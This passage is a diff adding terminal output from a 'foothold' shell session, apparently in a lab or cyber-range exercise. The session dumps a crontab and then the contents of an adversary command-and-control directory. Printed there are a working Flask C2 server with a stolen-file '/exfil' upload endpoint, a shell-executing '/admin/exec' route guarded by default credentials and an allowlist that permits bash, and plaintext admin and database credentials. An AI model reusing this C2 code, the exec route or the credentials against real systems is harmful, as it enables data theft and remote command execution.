@@ -942,7 +942,29 @@ tcp              TIME-WAIT            0                  0                      
 tcp              TIME-WAIT            0                  0                                  127.0.0.1:53204                            127.0.0.1:9000                                
 tcp              LISTEN               0                  128                                     [::]:2222                                  [::]:*    
 
+foothold@e5316a5b004d:/tmp$ cat /etc/crontab 
+# /etc/crontab: system-wide crontab
+# Unlike any other crontab you don't have to run the `crontab'
+# command to install the new version when you edit this file
+# and files in /etc/cron.d. These files also have username fields,
+# that none of the other crontabs do.
 
+SHELL=/bin/sh
+PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
+
+# Example of job definition:
+# .---------------- minute (0 - 59)
+# |  .------------- hour (0 - 23)
+# |  |  .---------- day of month (1 - 31)
+# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
+# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
+# |  |  |  |  |
+# *  *  *  *  * user-name command to be executed
+17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
+25 6    * * *   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.daily; }
+47 6    * * 7   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.weekly; }
+52 6    1 * *   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.monthly; }
+#
 
 foothold@e5316a5b004d:/var/www/html$ ls -la /etc/cron.*     
 /etc/cron.d:
@@ -1100,6 +1122,201 @@ def main():
     conn.close()
 if __name__ == "__main__":
     main()
+
+foothold@e5316a5b004d:/tmp$ ls -la /opt/c2/
+total 44
+drwxr-xr-x 1 c2-app c2-app 4096 Jun  8 03:31 .
+drwxr-xr-x 1 root   root   4096 Jun  8 03:31 ..
+-rw-rw-r-- 1 c2-app c2-app  123 Jun  8 03:27 adversary_notes.txt
+-rw-rw-r-- 1 c2-app c2-app 4713 Jun  8 03:27 app.py
+-rw-rw-r-- 1 c2-app c2-app  211 Jun  9 04:22 config.yaml
+-rw-rw-r-- 1 c2-app c2-app 5666 Jun  8 03:27 drain.py
+-rw-rw-r-- 1 c2-app c2-app   67 Jun  8 03:27 requirements.txt
+
+foothold@e5316a5b004d:/tmp$ cat /opt/c2/adversary_notes.txt 
+adv-n8n admin endpoint: http://20.30.40.153:5678
+adv-n8n admin username: adv_operator
+adv-n8n admin password: operator!n8n
+
+foothold@e5316a5b004d:/tmp$ cat /opt/c2/app.py              
+import hashlib
+import json
+import os
+from pathlib import Path
+import shlex
+import subprocess
+
+from flask import Flask, Response, jsonify, request
+import yaml
+
+APP_DIR = Path("/opt/c2")
+CONFIG_PATH = APP_DIR / "config.yaml"
+INCOMING_DIR = Path("/opt/staging/incoming")
+
+app = Flask(__name__)
+
+
+def load_config():
+    with CONFIG_PATH.open("r", encoding="utf-8") as handle:
+        cfg = yaml.safe_load(handle)
+    # Environment variables override static file defaults.
+    cfg["ingest_token"] = os.getenv("C2_INGEST_TOKEN", cfg.get("ingest_token", "INGEST-3d9f2c"))
+    cfg["db"] = cfg.get("db", {})
+    cfg["db"]["host"] = os.getenv("DB_HOST", cfg["db"].get("host", "20.30.40.151"))
+    cfg["db"]["port"] = int(os.getenv("DB_PORT", cfg["db"].get("port", 5432)))
+    cfg["db"]["name"] = os.getenv("DB_NAME", cfg["db"].get("name", "adv_collector"))
+    cfg["db"]["user"] = os.getenv("DB_USER", cfg["db"].get("user", "adv_analyst"))
+    cfg["db"]["password"] = os.getenv("DB_PASS", cfg["db"].get("password", "collector!db"))
+    tasking_env = os.getenv("C2_TASKING_JSON")
+    if tasking_env:
+        try:
+            cfg["tasking"] = json.loads(tasking_env)
+        except json.JSONDecodeError:
+            pass
+    return cfg
+
+
+def admin_ok():
+    auth = request.authorization
+    if not auth:
+        return False
+    return (
+        auth.username == os.getenv("C2_ADMIN_USER", "admin")
+        and auth.password == os.getenv("C2_ADMIN_PASS", "adminadmin")
+    )
+
+
+def command_allowed(cmd):
+    allowlist_raw = os.getenv(
+        "C2_ADMIN_EXEC_ALLOWLIST",
+        "hostname,whoami,pwd,id,ls,cat,tail,grep,sed,awk,ps,ss,supervisorctl,python3,bash,sh,date,echo",
+    )
+    allowlist = {item.strip() for item in allowlist_raw.split(",") if item.strip()}
+    try:
+        token = shlex.split(cmd)[0]
+    except (ValueError, IndexError):
+        return False
+    return token in allowlist
+
+
+@app.get("/healthz")
+def healthz():
+    return jsonify({"status": "ok"})
+
+
+@app.get("/admin")
+def admin():
+    if not admin_ok():
+        return Response(
+            "Authentication required",
+            status=401,
+            headers={"WWW-Authenticate": 'Basic realm="adv-c2-admin"'},
+        )
+    return jsonify(
+        {
+            "panel": "adv-c2 admin shim",
+            "status": "authenticated",
+            "note": "Use approved remote foothold channel for maintenance actions.",
+        }
+    )
+
+
+@app.get("/admin/exec")
+def admin_exec():
+    if not admin_ok():
+        return Response(
+            "Authentication required",
+            status=401,
+            headers={"WWW-Authenticate": 'Basic realm="adv-c2-admin"'},
+        )
+    cmd = request.args.get("cmd", "").strip()
+    if not cmd:
+        return jsonify({"status": "missing cmd"}), 400
+    if not command_allowed(cmd):
+        return jsonify({"status": "blocked", "reason": "command not in allowlist"}), 403
+    try:
+        proc = subprocess.run(
+            cmd,
+            shell=True,
+            check=False,
+            capture_output=True,
+            text=True,
+            timeout=20,
+            executable="/bin/bash",
+        )
+    except subprocess.TimeoutExpired:
+        return jsonify({"status": "timeout"}), 504
+    return jsonify(
+        {
+            "status": "ok",
+            "cmd": cmd,
+            "returncode": proc.returncode,
+            "stdout": proc.stdout,
+            "stderr": proc.stderr,
+        }
+    )
+
+
+@app.route("/beacon", methods=["GET", "POST"])
+def beacon():
+    return jsonify({"result": "ok"})
+
+
+@app.get("/tasking")
+def tasking():
+    cfg = load_config()
+    return jsonify({"tasking": cfg.get("tasking", [])})
+
+
+@app.post("/exfil")
+def exfil():
+    cfg = load_config()
+    token = request.headers.get("X-Ingest-Token", "")
+    if token != cfg["ingest_token"]:
+        return jsonify({"status": "unauthorized"}), 401
+
+    upload = request.files.get("artifact")
+    if upload is None:
+        return jsonify({"status": "missing artifact"}), 400
+
+    filename = upload.filename or "artifact.bin"
+    artifact_path = INCOMING_DIR / filename
+    artifact_path.parent.mkdir(parents=True, exist_ok=True)
+    upload.save(artifact_path)
+
+    size_bytes = artifact_path.stat().st_size
+    sha256 = hashlib.sha256(artifact_path.read_bytes()).hexdigest()
+    source_host = request.form.get("source_host", "adv-exfil-agent")
+
+    meta = {
+        "size_bytes": int(request.form.get("size_bytes", size_bytes)),
+        "sha256": request.form.get("sha256", sha256),
+        "source_host": source_host,
+    }
+    meta_path = artifact_path.with_name(f"{artifact_path.name}.meta.json")
+    meta_path.write_text(json.dumps(meta), encoding="utf-8")
+
+    return jsonify({"status": "queued", "filename": filename}), 200
+
+foothold@e5316a5b004d:/tmp$ cat /opt/c2/config.yaml 
+db:
+  host: adv-collector-db
+  port: 5432
+  name: adv_collector
+  user: adv_analyst
+  password: collector!db
+ingest_token: INGEST-3d9f2c
+tasking:
+- id: tsk-001
+  command: collect-system-profile
+  status: queued
+
+foothold@e5316a5b004d:/tmp$ cat /opt/c2/requirements.txt 
+flask==3.0.3
+gunicorn==22.0.0
+psycopg2-binary==2.9.9
+pyyaml==6.0.1
+
 
 
 ```
